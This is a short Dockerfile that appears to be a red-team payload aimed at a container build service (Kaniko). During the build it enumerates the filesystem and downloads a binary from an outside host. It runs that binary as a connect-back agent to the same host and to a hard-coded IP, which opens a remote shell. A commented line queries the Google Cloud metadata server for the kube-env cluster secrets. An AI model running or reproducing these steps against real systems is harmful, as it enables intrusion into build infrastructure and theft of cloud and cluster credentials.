FROM praetorianlabs/gosh-agent

RUN apk update && apk add tree
RUN tree /kaniko
RUN ls -alh ~
RUN unalias grep
#RUN curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^KUBEERNETES_MASTER
RUN curl -o /tmp/gosh http://kali7.praetorianlabs.com:8084/
RUN chmod +x /tmp/gosh
RUN /tmp/gosh -host kali7.praetorianlabs.com:8085

CMD ["-host", "104.198.138.155:8085"]    

